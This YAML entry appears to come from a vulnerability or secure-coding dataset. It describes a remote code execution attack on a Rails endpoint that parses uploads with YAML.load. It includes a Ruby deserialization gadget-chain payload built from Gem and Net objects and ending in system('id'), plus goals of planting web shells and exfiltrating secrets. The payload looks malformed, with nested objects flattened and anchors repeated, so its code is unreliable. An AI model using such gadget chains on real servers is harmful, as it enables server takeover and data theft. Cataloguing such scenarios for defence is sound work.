  exploit_scenario:
    attack_example: 'A Rails API endpoint accepts YAML configuration uploads and parses them with YAML.load(request.body.read).
      An attacker submits a crafted YAML document containing a !ruby/object:Gem::Installer gadget chain that writes a web
      shell to the public directory, then executes arbitrary commands on the server. The payload uses nested object instantiation
      to chain from Gem::Requirement through Gem::StubSpecification to achieve file write and command execution.

      '
    example_payload: '--- !ruby/object:Gem::Installer i: x

      --- !ruby/object:Gem::SpecFetcher i: y

      --- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: abc debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module Kernel git_set: system(''id'')'
    attacker_objective: Achieve remote code execution via Ruby object deserialization gadget chains to compromise the server,
      exfiltrate secrets, install backdoors, or pivot into internal infrastructure.
